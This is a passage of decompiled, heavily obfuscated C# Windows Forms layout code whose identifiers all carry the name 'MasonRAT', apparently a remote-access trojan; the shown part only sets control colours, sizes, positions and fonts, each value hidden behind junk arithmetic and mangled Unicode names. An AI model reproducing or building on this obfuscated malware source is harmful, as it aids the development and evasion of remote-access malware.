(257951909 >> 1742934008) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0, (777220529 - (90652164 | 476910463) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 ^ ((1133561957 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) >> (85303934 + 1420715332 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0));
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.FillColor3 = Color.FromArgb((1207959571 - (768952576 << 1165715347) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 ^ 1069383396 - (1002274520 | 70857940) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0, 1113019986 - 658914660 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 + ~(634359823 + -180254524 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0), (-1933060130 - 591553866 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + ~(1047409145 - -722944112 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0);
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.FillColor4 = Color.FromArgb((-75846955 ^ 195733582 % 131662993) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 + (((1968139420 ^ 22) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) >> ((427974476 ^ 8) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0), (2147293371 - 1957982207 % 1276669728 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 ^ (~2119252693 - 709733683 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) % (1860891795 + 1740487737 % 797399899 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1), (827365208 > 1383119241 ? -1417075837 : -1062806878) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 - -(1292633372 + ~229826415 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0));
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.Location = new Point(0, 0);
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 240 /*0xF0*/);
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.Size = new Size(((-1264798915 ^ 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 ^ -(697425003 + 567374292 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1), 630);
    this.\u2694️MasonRAT\u270Cۚٺۏڕﻼ\u0608ــڅ\u0609ـ\u060Dــ\u060Bءـ\u060A.TabIndex = (997035968 - 996967940 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) - (1114343313 - (971213051 >> 1475814095) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 >> 1077188973 - (111024471 | 937143625) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1);
    this.\u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ.Anchor = (AnchorStyles) ((1524072369 ^ 12) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 - (-1949237151 - 821657774 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1));
    this.\u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ.BackColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ.Cursor = Cursors.SizeAll;
    this.\u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ.FillColor = Color.White;
    this.\u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ.ForeColor = Color.Black;
    this.\u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ.Location = new Point((-2113928478 ^ 1590733849 << 704103545) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 + ((1019874416 ^ (1487182360 | 160561962)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 << (-1608882149 - (1486357227 << 2142115159) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0), 608);
    this.\u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 241);
    this.\u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ.Size = new Size((2117105390 > 207511511 ? -301989868 : -402653157) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 + ((209416345 ^ 9) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 << (886663937 ^ 1470545542 >> 1817129125) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0), 20);
    this.\u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ.TabIndex = (726179504 + -2136760590 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + (1332882076 - -77699027 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0;
    this.\u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ.TargetControl = (Control) this;
    this.\u2694️MasonRAT\u270Cـ\u0608ټـبؤـ؁\u060Aۏﮪ\u060Cـ.UseTransparentBackground = true;
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.Anchor = (AnchorStyles) ((1729896597 - (1451496948 >> 329319908) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) - (-185475289 - (1143622904 << 2025160750) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0);
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.BackColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.BorderRadius = ((738350186 ^ 704539804 << 1612861803) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) - -(-1800584580 - 1947465441 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0;
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.BorderThickness = 0;
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.Controls.Add((Control) this.\u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609);
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.Controls.Add((Control) this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ);
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.Controls.Add((Control) this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة);
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.Controls.Add((Control) this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ);
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.Cursor = Cursors.Default;
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.CustomBorderColor = Color.FromArgb(((-1720975549 ^ -1720976752) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 ^ (1813356831 > 821313795 ? 394949380 : 526599173) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0 >> (194903090 - (1290946817 << 2085634795) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, (-736696882 - 229951491 % 83619998 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + ((113483991 > 1169491089 ? 1065877901 : 799408426) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, ((-598618349 ^ -598618286) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 ^ (1784355014 << 486875495) - 764175088 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1));
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.FillColor = Color.FromArgb(97829032 - 178325420 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 - ~(223578856 - 143082420 % 632407295 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, (944774395 > 1712342106 ? -1686984646 : -1265238485) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 + ((-582361015 ^ ~1776033200) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1), ((-750106715 ^ -1958475032) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0 > (1095906931 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0 ? (769830331 > 728904535 ? 81 : 108) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0 : (-1073741716 /*0xC000006C*/ ^ 1399103238 << 1188257181) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0);
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.Font = new Font(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 242), 15.75f, FontStyle.Regular, (GraphicsUnit) ((1259710660 >> 1498686233) - 1104148551 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 + (1197167403 - (186037772 >> 862197665) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 >> ((-411142361 ^ -740518777) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0)), (byte) 0);
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.Location = new Point(2098105145 + -410658323 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 - (682451666 - -1004995144 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1, 50);
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 243);
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.ShadowDecoration.Enabled = true;
    this.\u2694️MasonRAT\u270Cۙ\u0608ة\u0608\u0608\u060Cﻋ\u0609ــ\u060A\u060Aڕ.Size = new Size(427093852 + -1500024905 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 + (360970599 + 693995498 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 | 119185576 - -301433624 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0, 547);
